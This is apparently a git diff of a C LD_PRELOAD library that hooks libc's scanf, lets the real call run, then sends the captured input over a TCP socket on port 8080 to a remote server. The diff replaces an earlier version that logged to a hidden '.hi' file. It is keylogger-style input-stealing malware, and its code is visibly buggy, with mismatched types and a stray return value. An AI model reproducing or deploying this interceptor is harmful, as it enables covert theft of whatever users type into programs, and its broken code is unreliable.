@@ -9,60 +9,54 @@
 #define PORT 8080
 
 #define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
-#define HIDDEN_FILE ".hi"
+//#define HIDDEN_FILE ".hi"
 
 typedef int (*sym)(const char *, ...);
+void sendToServer(char* toSend);
+//char*  handleArgs( char* format, va_list* arg);
 void* handle;
-FILE* fd;
+char buffer[1024] = {0};
+//FILE* fd;
 static void myinit() __attribute__((constructor));
 static void mydest() __attribute__((destructor));
 
 void myinit() 
 {
-	fd = fopen(HIDDEN_FILE,"w");
+	//fd = fopen(HIDDEN_FILE,"w");
     handle = dlopen(OBJ_PATH,RTLD_LAZY);
 }
 
 void mydest() 
 {
     dlclose(handle);
-    fclose(fd);
+    //fclose(fd);
 }
 
 int scanf ( const char * format, ... )
 {
-	char* itr = format;
-	unsigned int val_hex;
-	int has_val = 0;
 	sym orig_scanf;
 
 	orig_scanf = (sym)dlsym(handle,"scanf");
 	va_list arg;
+
 	va_start(arg, format);
-    orig_scanf(format, arg);
-	char* p = arg;
-	while (p != "\0")
-	{
-		printf(format, p);
-		++p;
-	}
+
+	//va_args returns null because of orig scanf?
+
+    int valScanf = orig_scanf(format, arg);
 	
-	printf("\n";
     sendToServer(arg);
 
 
-	return 0;
+	return valScanf;
 }
 
 
 
-void sendToServer(va_list arg)
+void sendToServer(char* toSend)
 {
-	int sock = 0, valread;
+	int sock = 0;;
 	struct sockaddr_in serv_addr;
-	// va_list arg;
-	// va_start(arg, format);
-	char buffer[1024] = {0};
 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 	{
 		printf("\n Socket creation error \n");
@@ -84,7 +78,38 @@ void sendToServer(va_list arg)
 		printf("\nConnection Failed \n");
 		return -1;
 	}
-	send(sock , arg , strlen(arg) , 0 );
+	printf("sending...");
+	send(sock , toSend , strlen(toSend) , 0 );
 	
 	
 }
+
+// char*  handleArgs(char* format, va_list* arg){
+
+//    int d;
+//    char c, *s;
+//    while (*format)
+//       {
+//          switch (*format++) {
+//       case 's':              /* string */
+//             s = va_arg(*p, char *);
+//             strcat(buffer, s);
+//             return strdup(buffer);
+//             break;
+//       case 'd':              /* int */
+//             d = va_arg(*p, int);
+//             printf("int %d\n", d);
+//             break;
+//       case 'c':              /* char */
+//             /* need a cast here since va_arg only
+//                takes fully promoted types */
+//             c = (char) va_arg(*p, int);
+//             printf("char %c\n", c);
+//             break;
+//       }
+//    }
+// 	return strdup(buffer);
+
+
+
+// }
